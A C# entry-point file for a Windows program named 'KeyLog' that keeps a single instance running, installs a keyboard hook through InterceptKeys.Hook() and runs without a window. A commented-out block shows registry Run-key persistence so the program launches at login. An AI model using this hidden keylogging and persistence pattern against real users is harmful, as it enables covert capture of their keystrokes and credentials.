using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Configuration;
//using FirebirdSql.Data.FirebirdClient;
using System.Data;
using System.Diagnostics;

namespace KeyLog
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            int intTrouve = 0;
            //Obtient le processus en cours de l'application
            Process Proc_EnCours = Process.GetCurrentProcess();
            //Collection des processus actuellement lancés
            Process[] Les_Proc = Process.GetProcesses();
            //Pour chaque processus lancé
            for (int i = 0; i < Les_Proc.Length; i++){
                if (Les_Proc[i].ProcessName.Equals("KeyLog")){
                    intTrouve = intTrouve + 1;
                }
            }
            if (intTrouve > 1){
                MessageBox.Show("Le programme est déja en cours d'utilisation !");
            }
            else{ 
                //====================================
                // MAKING THIS APP RUNNING ON STARTUP   
                //====================================
                /*
                Microsoft.Win32.RegistryKey rkApp = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                string[] Run_Keys = rkApp.GetSubKeyNames();
                int l = rkApp.SubKeyCount;
                string appPath = Application.ExecutablePath.ToString();

                if (rkApp.GetValue("KeyLog") == null)
                {
                    rkApp.SetValue("KeyLog", appPath);
                }
                else
                {
                    //rkApp.DeleteValue("KeyLog", false);
                } */

                InterceptKeys.Hook();
                Application.Run();
                
            }
        }

    }
}
